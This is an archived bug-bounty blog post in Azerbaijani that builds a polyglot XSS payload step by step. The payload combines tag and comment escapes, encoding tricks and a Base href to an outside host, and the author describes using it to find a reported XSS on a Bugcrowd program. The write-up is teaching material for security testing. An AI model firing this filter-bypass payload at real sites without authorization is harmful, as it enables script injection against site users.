# Poliqlot XSS payload vasitəsilə bug bounty ($$$)

- **Source URL:** https://memmedrehimzade.medium.com/poliqlot-xss-payload-vasit%C9%99sil%C9%99-bug-bounty-946732c1ba98?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20220907190640/https://memmedrehimzade.medium.com/poliqlot-xss-payload-vasit%C9%99sil%C9%99-bug-bounty-946732c1ba98
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/151 (id 151)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Poliqlot XSS payload vasitəsilə bug bounty ($$$)

Bug bounty həvəskarları üçün yazıram xüsusi olaraq — siz də standart sadə xss payloadlarını bütün bug bounty saytlarında sınamaqdan bezmisizsə ekrana yaxın əyləşin). Özüm aktiv şəkildə bug bounty ilə məşğul olmasam da hərdən qarşıma maraqlı üsullar, payload-lar çıxanda bəzi bug bounty platformalarında sınayıram.

Bu yaxınlarda bugcrowd platformasında poliqlot XSS -dən istifadə edərək tapdığım XSS açığını sizlərlə paylaşacam. Öncəliklə gəlin poliqlot XSS “reseptini” sizlərlə paylaşım və birgə payload hazırlayaq:

# Poliqlot XSS nədir?

Poliqlot XSS tənbəl bug hunter-lərin sevdiyi , özündə bir neçə XSS attack vektorunu cəmləyən XSS payload növüdür. Hansı ki bu payload bir sıra XSS -ə qarşı filtrasiyaları bypass edə bilir.

Gəlin poliqlot XSS payloadı hazırlayaq: əvvəlcə HTML injection konteksində sadə bir payload yazaq:

*\<K/contentEditable/autoFocus/OnFocus=(alert)(1)>*


İndi isə payload-ı biraz zənginləşdirək, ola bilsin ki bəzi teg-lərdən escape olmalıyıq :

**\</Title/\</Style/\</Script/\</textArea/\</iFrame/\</noScript>**\<K/contentEditable/autoFocus/OnFocus=(alert)(1)>


Escape olmaq üçün başqa teqlərdən də istifadə edə bilərik, bu şəxsi tərcihinizdir, hədəfə görə dəyişə bilər.

Növbəti mərhələdə javascript kommentlərdən escape olmamız üçün payloada bəzi əlavələr edək

**/\*’/\*\’/\*”/\*\”/\*\`/\*\\\`/\***\</Title/\</Style/\</Script/\</textArea/\</iFrame/\</noScript>\<K/contentEditable/autoFocus/OnFocus=**/\*\*/{**(alert)(1)**}//**>


Daha sonra komment, CSP bypass üçün tədbirlərimizi görək və DOM based XSS attack vektorunu da nəzərə alaraq yeni payloadı əlavə edək:

\<!–>/\*’/\*\’/\*”/\*\”/\*\`/\*\\\`/\*\</Title/\</Style/\</Script/\</textArea/\</iFrame/\</noScript>

**\74k**\<K/contentEditable/autoFocus/OnFocus=/\*\*/{(alert)(1)}//>\<Base/Href=//X55.is**\76**–>


Səbrli olun final mərhələyə yaxınlaşırıq:) İndi isə CRLF injection və octal encode -u da nəzərə alaraq payload-a yeni əlavələr edək:

JavaScript://%250Aalert?.(1)//\*’/\*\’/\*”/\*\”/\*\`/\*\\\`/\*%26apos;)/\*\<!–>\</Title/\</Style/\</Script/\</textArea/\</iFrame/\</noScript>

\74k\<K/contentEditable/autoFocus/OnFocus=/\*${/\*/;{/\*\*/(alert)(1)}//>\<Base/Href=//X55.is\76–>**\**


Unutmayın ki native javascriptdə sondakı backslash sintaksisi poza bilər və əziyyətimiz puç ola bilər ona görə də final olaraq payload-ı bu formada yaza bilərik:

JavaScript://%250Aalert?.(1)//

‘/\*\’/\*”/\*\”/\*\`/\*\\\`/\*%26apos;)/\*\<! →

\</Title/\</Style/\</Script/\</textArea/\</iFrame/\</noScript>

\74k\<K/contentEditable/autoFocus/OnFocus=

/\*${/\*/;{/\*\*/(alert)(1)}//>\<Base/Href=//X55.is\76 →


Qeyd: Bəzi simvollar mediumda düzgün render olunmadığı üçün pastebində orjinal payloadı paylaşıram :

Buradan baxa bilərsiz : [https://pastebin.com/BUUtKq5F](https://pastebin.com/BUUtKq5F)

# Poliqlot XSS -lə bugcrowd platformasında proqramlardan birində necə XSS tapdım?

Məqalənin əvvəlində anons verdiyim kimi bugcrowd platformasında proqramlardan birini XSS testi etmək qərarına gəldim, sadə olaraq yuxarıda hazırladığım payloadı saytın search bölməsinə paste etdim və …

Dublikat olmasın deyə tez report yazmaq lazımdır

Report qəbul olundu və fix etməyə çalışırlar hal-hazırda

Diqqətiniz üçün təşəkkürlər, yeni postlardan xəbərdar olmaq üçün izləmədə qalın, uğurlar hər birinizə.
